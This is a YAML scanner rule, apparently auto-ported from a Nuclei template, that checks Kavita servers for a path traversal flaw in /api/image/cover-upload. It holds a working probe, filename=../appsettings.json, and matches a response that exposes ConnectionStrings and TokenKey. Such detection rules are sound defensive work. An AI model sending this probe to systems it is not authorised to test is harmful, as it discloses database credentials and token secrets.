schema_version: 1
id: "cortex.community:kavita-lfi"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Kavita - Local File Inclusion"
  description: "Kavita - Path Traversal is vulnerable to local file inclusion via abusing the Path Traversal filename parameter of the /api/image/cover-upload. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/"
  cwes: [22]
  tags: ["kavita", "lfi", "huntr", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/api/image/cover-upload?filename=../appsettings.json" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"ConnectionStrings\":" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"Path\":" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"TokenKey\":" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
